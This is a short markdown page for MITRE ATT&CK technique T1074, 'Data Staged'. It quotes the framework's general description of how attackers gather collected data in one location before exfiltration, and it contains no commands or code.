# T1074 - Data Staged
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1074)
<blockquote>Collected data is staged in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Data Compressed](https://attack.mitre.org/techniques/T1002) or [Data Encrypted](https://attack.mitre.org/techniques/T1022).

Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.</blockquote>
